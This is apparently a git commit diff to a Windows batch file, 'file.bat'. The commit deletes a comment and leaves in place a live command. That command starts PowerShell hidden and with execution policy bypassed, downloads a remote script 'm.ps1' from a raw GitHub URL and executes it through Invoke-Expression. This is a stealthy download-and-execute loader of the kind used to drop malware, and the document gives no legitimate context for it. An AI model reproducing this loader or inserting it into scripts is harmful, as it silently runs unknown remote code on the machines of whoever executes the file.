d23e585ea9ede164f52f14cc354be71ea41d8cf7
k53xupn43 <digi2ocean@gmail.com>
2025-03-16 00:51:57 +0600

    Update file.bat

--- file.bat
+++ file.bat
@@ -1,5 +1,5 @@
 @echo off
 
-:: Run PowerShell to download and execute the script with a hidden console
 powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
+
 "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/k53xupn43/i965652f/refs/heads/main/m.ps1').Content"
